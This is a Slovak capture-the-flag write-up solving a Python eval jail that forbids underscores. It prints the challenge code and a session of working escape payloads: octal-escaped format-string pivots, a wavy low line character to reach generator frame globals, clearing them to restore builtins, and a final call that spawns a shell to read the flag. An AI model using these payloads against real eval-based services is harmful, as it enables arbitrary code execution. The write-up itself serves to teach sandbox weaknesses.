# Zadanie

EN: A new version of The Calculator came out! Can you check if it’s secure?

SK: Vyšla nová verzia kalkulačky! Môžeš otestovať, či je bezpečná?

`exp.cybergame.sk:7011`

**Súbory:**

- calculatorv2.zip

## Riešenie

V archíve bol zabalený dockerfile, ktorý bol sám o sebe nezaujímavý, ale napovedal, že vlajka je v koreňovom adresári premenovaná, aby obsahovala aj náhodné číslo v názve

```dockerfile
RUN mv /flag.txt /flag$(shuf -i 1-1000000 -n 1).txt
```

Samotný python súbor, z ktorého máme uniknúť je už iná liga.

```python
import math


def handle_client():
    print(
        "Welcome to the Calculator v2!\nWith improved security so you can have access to all the fun math stuff and the bad guys cannot do the bad stuff! Enjoy :D"
    )

    # We added this to prevent the user from calling dangerous functions
    safe_globals = {
        "__builtins__": {
            "sin": math.sin,
            "cos": math.cos,
            "tan": math.tan,
            "asin": math.asin,
            "acos": math.acos,
            "atan": math.atan,
            "sqrt": math.sqrt,
            "pow": math.pow,
            "abs": abs,
            "round": round,
            "min": min,
            "max": max,
            "sum": sum,
        }
    }

    text = ""
    while text != "exit":
        text = input(">>> ")
        # In all ctf writeups they use _ or its unicode equivalent to somehow escape the jail. No _ means no fun for them
        for character in ["_", "＿"]:
            if character in text.lower():
                print("Not allowed, killing\n")
                text = "lol"
        try:
            print(eval(text, safe_globals))
        except Exception as e:
            print("Error: " + str(e) + "\n")


def main():
    handle_client()


if __name__ == "__main__":
    main()
```

A tu vidíme najväčšie obmedzenie oproti prvej verzii calculatora... Vidíme, že máme obmedzené podtržníky aj ich unicode plnošírkového brata, takže kombinácia, ktorou môžeme využiť dunder metódy je nemožná.. Kvôli Connector puntuaction potrebujeme aspoň jeden základný podtržník, ktorý síce môže byť nasledovaný plnošírkovou verziou, ale bez toho štandardného sa nezabídeme.. Takže dunder  **D**ouble **UNDER** je nemožný.. `safe_globals` dictionary obsahuje kľúč `__builtins__` s veľmi obmedzeným množstvom funkcíí, zameranými výlučne na matematické operácie... Tu cesta nevedie... Môžeme síce použiť `lambda` ale opať len spolu s funkciami, ktoré sú definované v global namespace pre eval a teda v premmenej safe_globals. Vieme ale pivotovat atribútmi pomocou dunder, ale len vrámci string format, čo nám ale vždy vráti len stringovú reprezentáciu objektu/funkcie a pod., ale nie samotnú referenciu na objekt/funkciu,... 

Priradiť premenné pomocou `=` sa nedá, ale od nejakej verzie pythonu existuje tzv. `walrus` operátor `:=`. 

```
>>> a = 1
Error: invalid syntax (<string>, line 1)

>>> a:= 1
Error: invalid syntax (<string>, line 1)

>>> (a:= 1)
1

>>> a+a
2

>>> "{0.\137\137self\137\137.help.\137\137call\137\137.\137\137globals\137\137[sys].modules[os].environ}".format(min)
environ({'HOSTNAME': 'a6c6677c02e2', 'PYTHON_PIP_VERSION': '24.0', 'HOME': '/root', 'GPG_KEY': '7169605F62C751356D054A26A821E680E5FA6305', 'PYTHON_GET_PIP_URL': 'https://github.com/pypa/get-pip/raw/dbf0c85f76fb6e1ab42aa672ffca6f0a675d9ee4/public/get-pip.py', 'PATH': '/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'LANG': 'C.UTF-8', 'PYTHON_VERSION': '3.12.3', 'PWD': '/app', 'PYTHON_GET_PIP_SHA256': 'dfe9fd5c28dc98b5ac17979a953ea550cec37ae1b47a5116007395bfacff2ab9', 'SOCAT_PID': '8', 'SOCAT_PPID': '7', 'SOCAT_VERSION': '1.7.4.4', 'SOCAT_SOCKADDR': '172.24.0.228', 'SOCAT_SOCKPORT': '2337', 'SOCAT_PEERADDR': '172.24.0.2', 'SOCAT_PEERPORT': '57064', '_STDBUF_I': '0', '_STDBUF_O': '0', '_STDBUF_E': '0', 'LD_PRELOAD': '/usr/libexec/coreutils/libstdbuf.so'})

>>> (a := ("{0.\137\137self\137\137.help.\137\137call\137\137.\137\137globals\137\137[sys].modules[os]}".format(min)))
<module 'os' (frozen)>

>>> a()
Error: 'str' object is not callable
```

To sa mi síce podarilo priradiť pod akúkoľvek mnou definovanú premennú čokoľvek, ale stále som dokázal priradiť iba to čo bolo definované (integer, tuple, dictionary, string, referenciu na funkciu(min, max, lambda), ale stále nič potrebné na escape, pretože to nedokážem zavolať...

Ale podarilo sa mi vytvoriť generator objekt, ktorý má sám o sebe prístup k frame, ale pomocou atribútov obsahujúcich `_`..

```
>>> (i for i in [])
<generator object <genexpr> at 0x7f71e6f6d000>
>>> (gen := (i for i in []))
<generator object <genexpr> at 0x7f71e6f6cdc0>
>>> "{0.gi\137frame}".format(gen)
<frame at 0x7f71e6fbcb40, file '<string>', line 1, code <genexpr>>
>>> "{0.gi\137frame.f\137globals}".format(gen)
{'__builtins__': {
  'sin': <built-in function sin>, 
  'cos': <built-in function cos>, 
  'tan': <built-in function tan>, 
  'asin': <built-in function asin>, 
  'acos': <built-in function acos>, 
  'atan': <built-in function atan>, 
  'sqrt': <built-in function sqrt>, 
  'pow': <built-in function pow>, 
  'abs': <built-in function abs>, 
  'round': <built-in function round>, 
  'min': <built-in function min>, 
  'max': <built-in function max>, 
  'sum': <built-in function sum>
}, 
'gen': <generator object <genexpr> at 0x7f71e6f6cdc0>}>
>>> gen.gi_frame
Not allowed, killing

Error: name 'lol' is not defined
```

Tu vidím v `f_glboals` aj mnou vytvorenú premennú gen, takže viem, že som správne... 

https://www.compart.com/en/unicode/U+005f

Avšak podtržník má viacero variantov a zistenie, že unicode variant  môžeme použiť len zo štandradným platí, ale len pre dunder...``gi_frame`` ale nie je dunder. Skúsim napríklad variant `U+FE4F` tzv. Wavy Low Line = `﹏`

```
>>> (gen:=(i for i in[]))
<generator object <genexpr> at 0x7f3bf7608d00>

>>> gen.gi﹏frame
<frame at 0x7f3bf7658b40, file '<string>', line 1, code <genexpr>>

>>> gen.gi﹏frame.f﹏globals
{'__builtins__': {'sin': <built-in function sin>, 'cos': <built-in function cos>, 'tan': <built-in function tan>, 'asin': <built-in function asin>, 'acos': <built-in function acos>, 'atan': <built-in function atan>, 'sqrt': <built-in function sqrt>, 'pow': <built-in function pow>, 'abs': <built-in function abs>, 'round': <built-in function round>, 'min': <built-in function min>, 'max': <built-in function max>, 'sum': <built-in function sum>}, 'gen': <generator object <genexpr> at 0x7f3bf7608d00>}

>>> gen.gi﹏frame.f﹏globals.clear()
None

>>> gen.gi﹏frame.f﹏globals
Error: name 'gen' is not defined

>>> (gen:=(i for i in[]))
<generator object <genexpr> at 0x7f3bf7608dc0>


>>> gen.gi﹏frame.f﹏globals
{'__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThis module is not normally accessed explicitly by most\napplications, but can be useful in modules that provide\nobjects with the same name as a built-in value, but in\nwhich the built-in of that name is also needed.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'aiter': <built-in function aiter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'anext': <built-in function anext>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'BaseExceptionGroup': <class 'BaseExceptionGroup'>, 'Exception': <class 'Exception'>, 'GeneratorExit': <class 'GeneratorExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'SystemExit': <class 'SystemExit'>, 'ArithmeticError': <class 'ArithmeticError'>, 'AssertionError': <class 'AssertionError'>, 'AttributeError': <class 'AttributeError'>, 'BufferError': <class 'BufferError'>, 'EOFError': <class 'EOFError'>, 'ImportError': <class 'ImportError'>, 'LookupError': <class 'LookupError'>, 'MemoryError': <class 'MemoryError'>, 'NameError': <class 'NameError'>, 'OSError': <class 'OSError'>, 'ReferenceError': <class 'ReferenceError'>, 'RuntimeError': <class 'RuntimeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'SyntaxError': <class 'SyntaxError'>, 'SystemError': <class 'SystemError'>, 'TypeError': <class 'TypeError'>, 'ValueError': <class 'ValueError'>, 'Warning': <class 'Warning'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'BytesWarning': <class 'BytesWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'EncodingWarning': <class 'EncodingWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'UserWarning': <class 'UserWarning'>, 'BlockingIOError': <class 'BlockingIOError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionError': <class 'ConnectionError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'InterruptedError': <class 'InterruptedError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'IndentationError': <class 'IndentationError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'RecursionError': <class 'RecursionError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'UnicodeError': <class 'UnicodeError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'TabError': <class 'TabError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'ExceptionGroup': <class 'ExceptionGroup'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2023 Python Software Foundation.
All Rights Reserved.

Copyright (c) 2000 BeOpen.com.
All Rights Reserved.

Copyright (c) 1995-2001 Corporation for National Research Initiatives.
All Rights Reserved.

Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
All Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands
    for supporting Python development.  See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'gen': <generator object <genexpr> at 0x7f3bf7608dc0>}
```

A tu vidím, že sa to podarilo... Pristúpil som k samotnému objektu f_globals, pomocou clear() som ho vyčistil, čím som stratil aj samotné gen, ale vytvoril som si nové a vidím, že už nemám definované `__builtins__` so safe_globals, ale defaultné... eval máme teda bez obmedzení na matematické funkcie, ale stále platí obmedzenie na podtržníky pre dunder metódy, no nie ked ich použijeme escapnuté v stringu vnútri hranatých zátvoriek. Spawnem si shell pomocou `__import__["os"].system("sh")`

```
Welcome to the Calculator v2!
With improved security so you can have access to all the fun math stuff and the bad guys cannot do the bad stuff! Enjoy :D
>>> (i for i in[]).gi﹏frame.f﹏globals.clear()
None
>>> (i for i in[]).gi﹏frame.f﹏globals["\137\137builtins\137\137"]["\137\137import\137\137"]("os").system("sh")
cat /flag*
SK-CERT{wh0_w0uld_h4v3_th0ght_y0u_c4n_3sc4pe_w1th0ut__}
```

## Vlajka

```
SK-CERT{wh0_w0uld_h4v3_th0ght_y0u_c4n_3sc4pe_w1th0ut__}
```
